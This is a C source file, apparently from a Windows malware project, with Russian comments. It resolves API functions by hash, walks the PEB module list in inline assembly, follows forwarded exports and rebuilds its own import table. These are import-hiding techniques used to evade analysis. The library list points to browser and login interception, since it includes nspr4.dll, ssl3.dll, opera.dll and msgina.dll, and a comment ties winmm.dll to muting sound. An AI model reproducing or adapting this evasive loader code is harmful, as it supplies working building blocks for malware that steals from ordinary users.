#include <windows.h>

#include "Getapi.h"
#include "ntdll.h"
#include "Inject.h"
#include "InjectUtils.h"

#define USER32_DLL_HASH     0xd612ffcd
#define ADVAPI32_DLL_HASH	0x4434aacc
#define NTDLL_DLL_HASH		0xab30a50a

//
//				Global Var

	 PVOID ImageNtdll;		// База нтдлл

//
//

DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}
HMODULE GetKernel32(void)
{    
	return GetDllBase(0x4B1FFE8E);
}

//
//	CallBack для перечесления модулей.
//
VOID NTAPI LdrEnumCallBack ( IN PLDR_DATA_TABLE_ENTRY DataTableEntry,IN PVOID Context, IN OUT BOOLEAN *StopEnumeration )
{
	struct CONTEXT_LDR_ENUM
	{
		DWORD DllHash;
		BOOL  IsValid;
		LDR_DATA_TABLE_ENTRY LdrEntry;
	};

	WCHAR wcDllName[MAX_PATH];
	CONTEXT_LDR_ENUM	*pctxldr_enum = (CONTEXT_LDR_ENUM*)Context;

	if ( pctxldr_enum == NULL )
	{
		*StopEnumeration = TRUE;
		return ;
	}

	wcDllName[ DataTableEntry->BaseDllName.Length / sizeof( WCHAR )] = 0;

    m_wcsncpy( wcDllName, DataTableEntry->BaseDllName.Buffer,  MAX_PATH - 1 );

    if ( CalcHashW( m_wcslwr( wcDllName ) ) == pctxldr_enum->DllHash )
	{
		m_memcpy(&pctxldr_enum->LdrEntry,DataTableEntry,sizeof(LDR_DATA_TABLE_ENTRY));
		pctxldr_enum->IsValid = TRUE;
		*StopEnumeration = TRUE;
    }
}

HMODULE GetDllBase( DWORD dwDllHash )
{   
	struct CONTEXT_LDR_ENUM
	{
		DWORD DllHash;
		BOOL  IsValid;
		LDR_DATA_TABLE_ENTRY LdrEntry;
	};

	CONTEXT_LDR_ENUM	ctxldr_enum;
	ctxldr_enum.DllHash = dwDllHash;

	NTSTATUS (NTAPI*LdrEnumerateLoadedModules)(ULONG,PVOID/*CallBack*/,PVOID/*Context*/) = (NTSTATUS (NTAPI*)(ULONG,PVOID,PVOID))GetApiAddr((HMODULE)ImageNtdll,0xBF639C5E);
	
	if ( LdrEnumerateLoadedModules )
	{
		ctxldr_enum.IsValid = FALSE;
		LdrEnumerateLoadedModules(0,LdrEnumCallBack,&ctxldr_enum);
		if ( ctxldr_enum.IsValid )
			return (HMODULE)ctxldr_enum.LdrEntry.DllBase;
	}
	return NULL;
}

HMODULE GetDllBaseByPEB( DWORD dwDllHash )
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, MAX_PATH - 1 );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}



LPVOID GetForvardedProc(PCHAR Name)
{
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	if (Name == NULL)
 		return NULL;

	char DLLName[255];
	m_memset(DLLName, 0, sizeof(DLLName));

	PCHAR NameStr = STR::Scan(Name, '.');
	if (NameStr == NULL)
		return NULL;

	// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	m_lstrcat(DLLName, ".dll");

	// определяем имя функции
	NameStr++;
	if (*NameStr == '#')
	{
		// Имя является номером функции
		NameStr++;
		DWORD OrdNomber = m_atoi(NameStr);
		return GetProcAddressEx(DLLName, 0, OrdNomber);
	}
	DWORD Hash = CalcHash(NameStr);
	return GetProcAddressEx(DLLName, 0, Hash);
}


LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
{
	/*----------- Функция возвращает адрем функции по её названию -----------*/

    // Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// Получаем адрес таблицы експорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int Ordinal = 0; // Норем необходимой нам функции

	if ( HIWORD(ProcNameHash) == 0 )
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Ищем функцию по номеру
		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char * ProcName;
		for ( i = 0; i < Table->NumberOfNames; i++)
		{
			ProcName = (char*)RVATOVA(Module, *NamesTable);
			if (CalcHash(ProcName) == ProcNameHash )
			{
				Ordinal = *OrdinalTable;
				break;
			}
			// Увеличиваем позицию в таблице
			NamesTable++;
			OrdinalTable++;
		}
	}

	// не нашли номер
	if (Ordinal == 0)
		return NULL;

	// Определяем адрес функции
	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	DWORD RVA		  = AddrTable[Ordinal];
	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );

	// проверяем на переназначение экспорта
	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);

	return (LPVOID)Ret;
}


LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
{

//-----------------------------------------------------------------------------

	// Названия используемых библиотек
	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', 0};
	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
	const static char msgina_dll[]   = {'m','s','g','i','n','a','.','d','l','l',0};
	//-----------------------------------------------------------------------
	HMODULE Module = NULL;


	char *DllName = Dll;
  if ( DllName == NULL )
  {
		switch ( dwModule  ) 
		{
		case(1):
			Module = GetKernel32();	break;
			break;
		case(2):
			Module = GetDllBase( ADVAPI32_DLL_HASH );break;
				break;
		case(3):
			Module = GetDllBase( USER32_DLL_HASH );break;

		case(4):
			DllName = (PCHAR)ws2_32_dll;break;
			
		case(5):
			Module = GetDllBase( NTDLL_DLL_HASH );break;

		case(6):
			DllName = (PCHAR)winsta_dll;break;
		
		case(7):
			DllName = (PCHAR)shell32_dll;break;
		
		case(8):
			DllName = (PCHAR)wininet_dll;break;
		
		case(9):
			DllName = (PCHAR)urlmon_dll;break;
			
		case(10):
			DllName = (PCHAR)nspr4_dll;break;
			
		case(11):
			DllName = (PCHAR)ssl3_dll;break;
			
		case(12):
			DllName = (PCHAR)winmm_dll;break;// для вырубания звука
			
		case(13):
			DllName = (PCHAR)cabinet_dll;break;//для архивирования
			
		case(14):
			DllName = (PCHAR)opera_dll;break;//для оперы
			
		case(15):
			DllName = (PCHAR)gdi32_dll; break;

		case(16):
			DllName = (PCHAR)gdiPlus_dll; break;

		case(17):
			DllName = (PCHAR)crypt32_dll; break;

		case(18):
			DllName = (PCHAR)msgina_dll;	break;
		default:
			return 0;
		}
	}	
	
	if (Module == NULL && !STR::IsEmpty(DllName))
	{
		Module = (HMODULE)pGetModuleHandleA(DllName);
		if (Module == NULL)
			Module = (HMODULE)pLoadLibraryA(DllName);
	}

	/*LPVOID ret = (LPVOID)0x00000000; так было ранее

	if (hModule != NULL)
		ret = GetApiAddr( hModule, dwProcNameHash );*/
/***/ // так стало

	if (dwProcNameHash == 0)
		return Module;

	LPVOID ret = GetApiAddr(Module, dwProcNameHash);

	if ( ret == NULL )
		return (LPVOID)0x00000000;

	return ret;
} 


VOID InitializeNTDLL();
BOOL InitializeImportCurrentModule();

BOOL WINAPI InitializeAPI()
{
  BOOL bRet;
	InitializeNTDLL();	//	Инициализация нтдлл и сохранение ее адреса

	bRet = InitializeImportCurrentModule();	//	настройка импорта текущей длл
	
	return bRet;
}

BOOL IsImagePE(PVOID Image)
{
	PIMAGE_NT_HEADERS   pNtHeader =(PIMAGE_NT_HEADERS)((PCHAR)Image +((PIMAGE_DOS_HEADER)Image)->e_lfanew);

	if ( ((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
		return FALSE;

	if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
		return FALSE;

	if (  pNtHeader->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE )
		return TRUE;

	return FALSE;
}


BOOL IsNTDLL(PVOID Image)
{
	//
	//	Просто проверяет содержит ли указанный образ длл/ехе такие експлортируемые функ:
	//	Если да то это нтдлл.
	// 
	if ( GetApiAddr((HMODULE)Image,0x3D9AC241) )
	if ( GetApiAddr((HMODULE)Image,0x323C2875) )
	if ( GetApiAddr((HMODULE)Image,0xDD39FD14) )
		return TRUE;
	
	return FALSE;
}


VOID InitializeNTDLL()
{

	ImageNtdll = GetDllBaseByPEB(0xab30a50a);

	return ;
}

BOOL InitializeImportCurrentModule()
{
	return BuildImport((PVOID) GetImageBase() ) != NULL;
}